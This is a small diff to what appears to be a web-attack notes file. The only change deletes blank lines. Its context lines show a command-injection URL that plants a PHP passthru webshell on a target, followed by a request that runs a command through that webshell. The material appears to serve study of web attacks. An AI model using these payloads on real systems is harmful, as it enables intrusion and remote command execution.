@@ -359,10 +359,6 @@ http://target:80/php/index.php?ip=127.0.0.1;echo+%22%3Cpre%3E%3C?php+passthru(\$
 http://target/webshell.php?cmd=ls-lsa
 ```
 
-
-
-
-
 ![alt text](https://res.cloudinary.com/dqrcefije/image/upload/v1749448244/web-attack/explicit_checks.png)
 
 ##### windows
